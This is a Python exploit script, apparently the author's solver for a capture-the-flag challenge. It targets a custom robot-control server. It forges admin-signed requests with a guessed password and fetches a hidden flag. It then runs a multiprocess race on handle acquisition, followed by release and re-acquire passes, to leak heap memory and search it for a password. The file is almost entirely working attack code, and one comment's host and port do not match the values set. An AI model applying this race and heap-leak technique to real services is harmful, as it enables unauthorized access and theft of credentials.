import hashlib
import hmac
import multiprocessing
import socket
import struct

# Define the target: IPv6 loopback and port 8080
host = "9000:d37e:c40b:8954:216:3eff:fe22:7a3"
port = 21374

CMD_LIST_ROBOTS = 1001
CMD_HIDDEN_FLAG = 1002
CMD_ACQUIRE_ROBOT_HANDLE = 1004
CMD_RELEASE_ROBOT_HANDLE = 1005
CMD_STATUS = 2005


def generate_signature(username: bytes, password: bytes, op: int, payload: bytes):
    key = password
    h = hmac.new(key, digestmod=hashlib.sha256)
    h.update(username)
    h.update(struct.pack("<I", op))
    h.update(payload)
    return h.digest()


def send(op, payload) -> tuple[int, int, bytes]:
    try:
        with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as s:
            s.connect((host, port))

            magic = 0x50455354
            username = b"admin" + b"\0" * 27
            password = b"AAAAAAAAAAAAAAAAAAAA"

            signature = generate_signature(username, password, op, payload)
            header = struct.pack(
                "<I32sIII", magic, signature, op, 1024 * 8, len(payload)
            )

            s.sendall(header)
            if len(username) > 0:
                s.sendall(username)
            if len(payload) > 0:
                s.sendall(payload)

            resp_header = s.recv(12)
            err, op, length = struct.unpack("<III", resp_header)

            result = b""
            if length > 0:
                result = s.recv(length)

            return err, op, result
    except ConnectionRefusedError:
        print(f"Error: Connection refused. Is there a server listening on port {port}?")
    except Exception as e:
        print(f"An error occurred: {e}")


def get_hidden_flag():
    _, _, result = send(CMD_HIDDEN_FLAG, b"")
    print(f"Hidden flag: {result.decode()}")


def get_ids():
    _, _, result = send(CMD_LIST_ROBOTS, b"")
    ids = result.decode().splitlines()
    return ids


def acquire_and_send(id: str, barrier, queue):
    print(f"Acquiring handle for {id}")
    _, _, handle = send(CMD_ACQUIRE_ROBOT_HANDLE, id.encode())
    barrier.wait()

    print(f"Requesting status for ID {id}")
    err, _, status = send(CMD_STATUS, handle)
    queue.put({"id": id, "handle": handle, "err": err, "status": status})

    print(f"Process done for ID {id}")


def try_leak(ids: list[str]):
    sync_barrier = multiprocessing.Barrier(len(ids))
    output_queue = multiprocessing.Queue()

    processes: list[multiprocessing.Process] = []
    for id in ids:
        print(f"Starting process for ID {id}")
        p = multiprocessing.Process(
            target=acquire_and_send, args=(id, sync_barrier, output_queue)
        )
        processes.append(p)
        p.start()

    outputs = []
    for _ in range(len(ids)):
        outputs.append(output_queue.get())

    for p in processes:
        p.join()

    print("All processes done")

    # Participants wouldn't know what to search, but we can simplify the output for testing ;)
    for output in outputs:
        index = output["status"].find(b"B8GdLzX^*@&vD$pG35&pRFLdhXNnLNt")
        if index != -1:
            print("Found password!")
            print(
                output["status"][
                    max(0, index - 512) : min(index + 512, len(output["status"]))
                ]
            )
        else:
            print("Password NOT found...")

    print("Now that all handles were reached, do a second pass to try to leak heap")
    for output in outputs:
        send(CMD_RELEASE_ROBOT_HANDLE, output["handle"])
        _, _, handle = send(CMD_ACQUIRE_ROBOT_HANDLE, output["id"].encode())
        err, _, status = send(CMD_STATUS, handle)
        index = status.find(b"B8GdLzX^*@&vD$pG35&pRFLdhXNnLNt")
        if index != -1:
            print("Found password!")
            print(status[max(0, index - 512) : min(index + 512, len(status))])
        else:
            print("Password NOT found...")


def main():
    get_hidden_flag()

    ids = get_ids()
    try_leak(ids)


if __name__ == "__main__":
    main()
